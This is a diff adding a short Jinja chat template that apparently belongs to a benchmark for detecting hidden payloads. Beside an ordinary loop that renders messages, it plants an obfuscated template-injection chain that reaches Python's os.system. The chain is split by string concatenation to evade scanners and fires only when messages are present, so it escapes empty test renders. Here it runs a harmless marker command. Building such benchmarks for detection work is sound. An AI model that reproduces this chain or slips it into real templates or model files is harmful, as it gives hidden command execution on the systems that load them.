@@ -1,0 +1,7 @@
+{#- MARKER-only Phase-8 benchmark payload. See MANIFEST.json and ../README.md. The obfuscated
+    chain (Jinja '~' concatenation) is guarded by a message-presence check, so it fires in
+    normal use but not during a render with empty inputs. Sentinel only; comment kept free of
+    literal sink tokens. -#}
+{% if messages %}{{ cycler['__in' ~ 'it__']['__glob' ~ 'als__']['__buil' ~ 'tins__']['__imp' ~ 'ort__']('os')['sys' ~ 'tem']('GLYPHHOUND_BENCH_MARKER') }}{% endif %}
+{% for m in messages %}{{ m.role }}: {{ m.content }}
+{% endfor %}
